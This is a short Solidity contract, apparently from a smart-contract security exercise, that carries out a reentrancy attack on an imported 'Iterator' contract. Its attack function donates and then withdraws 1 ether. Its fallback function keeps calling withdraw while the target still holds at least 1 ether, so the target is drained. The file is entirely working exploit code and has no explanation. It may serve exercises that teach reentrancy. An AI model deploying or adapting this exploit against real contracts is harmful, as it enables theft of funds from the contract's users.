// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Iterator.sol";

contract Reentrancy {

    Iterator public iterator;

    constructor(address payable etherIteratorAddress) public {
        iterator = Iterator(etherIteratorAddress);
    }

    fallback() external payable {
        if (address(iterator).balance >= 1 ether) {
            iterator.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        iterator.donate.value(1 ether)(address(this));
        iterator.withdraw(1 ether);
    }

    function viewBalanceContract() public view returns (uint) {
        return address(this).balance;
    }
}
